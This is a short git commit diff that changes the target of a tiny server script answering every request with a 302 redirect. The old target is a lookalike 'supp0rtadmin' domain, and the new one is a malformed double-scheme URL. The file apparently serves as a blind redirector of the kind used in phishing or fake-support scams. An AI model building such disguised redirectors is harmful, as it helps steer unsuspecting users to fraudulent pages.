94567cae741e29e65fadf4e401fee77fa111b18e
Digital2025001 <bosmichael30@gmail.com>
2026-01-15 10:50:53 -0800

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "http://khassasupp0rtadmin.vercel.app//", // Replace this with your actual link
+      Location: "https://https://server-application.com", // Replace this with your actual link
     },
   });
 });
